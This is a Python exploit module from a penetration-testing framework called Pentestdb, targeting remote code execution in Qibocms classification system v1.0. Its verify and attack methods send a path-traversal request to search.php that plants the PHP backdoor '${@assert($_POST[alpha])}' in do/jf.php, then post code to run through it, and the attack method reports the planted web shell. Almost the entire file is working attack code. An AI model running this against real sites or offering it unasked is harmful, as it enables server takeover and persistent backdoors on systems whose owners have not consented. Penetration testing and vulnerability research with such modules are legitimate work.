#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

from script.exploit import Exploit, Result


class QibocmsRCE(Exploit):
    expName = u"齐博cms分类系统远程代码执行"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "qibocms"
    appVersion = "1.0"
    reference = ['http://www.wooyun.org/bugs/wooyun-2015-0122599/', 'http://0day5.com/archives/3261']
    description = u'''
        齐博cms分类系统，v1.0
    '''

    def verify(self):
        result = Result()

        phpPayload = "${@assert($_POST[alpha])}"
        #phpPayload = "${@fwrite(fopen('ali.php', 'w+'),'test')}"

        sig = '3825337'
        
        self.params['mid'] = "1"
        self.params['action'] = "search"
        self.params['keyword'] = "asd"
        self.params['postdb[city_id]'] = "../../admin/hack"
        self.params['hack'] = "jfadmin"
        self.params['action'] = "addjf"
        self.params['Apower[jfadmin_mod]'] = "1"
        self.params['fid'] = "1"
        self.params['title'] = phpPayload

        url = self.baseURL if "search.php" in self.baseURL else self.host+"/search.php"

        session = self.http.Session()

        try:
            response1 = session.get(url, params=self.params)
        except session.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        payload = {"alpha":"print {0};".format(sig)}
        url = url.replace("search.php","do/jf.php")
        try:
            response2 = session.post(url, data=payload)
        except session.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response2.status_code == 200:
            if sig in response2.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = str(payload)

        return result


    def attack(self):
        result = Result()

        phpPayload = "${@assert($_POST[alpha])}"

        sig = '3825337'
        
        self.params['mid'] = "1"
        self.params['action'] = "search"
        self.params['keyword'] = "asd"
        self.params['postdb[city_id]'] = "../../admin/hack"
        self.params['hack'] = "jfadmin"
        self.params['action'] = "addjf"
        self.params['Apower[jfadmin_mod]'] = "1"
        self.params['fid'] = "1"
        self.params['title'] = phpPayload

        url = self.baseURL if "search.php" in self.baseURL else self.host+"/search.php"

        session = self.http.Session()

        try:
            response1 = session.get(url, params=self.params)
        except session.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        payload = {"alpha":"print {0};".format(sig)}
        url = url.replace("search.php","do/jf.php")
        try:
            response2 = session.post(url, data=payload)
        except session.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response2.status_code == 200:
            if sig in response2.content:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.baseURL+"/do/jf.php"
                result['ShellInfo']['Content'] = phpPayload

        return result